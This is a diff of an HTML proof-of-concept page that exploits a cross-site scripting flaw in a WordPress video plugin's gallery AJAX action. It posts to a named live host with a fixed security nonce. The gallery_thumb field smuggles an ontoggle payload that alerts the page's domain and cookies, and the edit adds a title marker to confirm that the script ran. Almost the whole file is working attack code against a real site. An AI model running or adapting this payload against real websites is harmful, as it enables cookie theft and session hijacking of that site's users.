@@ -1,7 +1,7 @@
 <!doctype html>
 <meta charset="utf-8">
 <title>Videopack XSS domain and cookie alerts</title>
-<form id="poc" method="post" enctype="multipart/form-data"
+<form id="poc" method="post"
       action="https://videorulebook.nba.com/wp-admin/admin-ajax.php">
   <input name="action" value="kgvid_switch_gallery_page">
   <input name="security" value="8df5c8250d">
@@ -13,7 +13,7 @@
   <input name="query_atts[gallery_id]" value="0">
   <input name="query_atts[gallery_exclude]" value="">
   <input name="query_atts[gallery_include]" value="3427">
-  <input name="query_atts[gallery_thumb]" value='250"><details open ontoggle="alert(document.domain);alert(document.cookie)">' >
+  <input name="query_atts[gallery_thumb]" value='250"><details open ontoggle="alert(document.domain);alert(document.cookie);document.title=`XSS_TWO_ALERTS_RAN`">' >
   <input name="query_atts[caption]" value="">
   <input name="query_atts[skin]" value="">
   <input name="query_atts[gallery_end]" value="close">
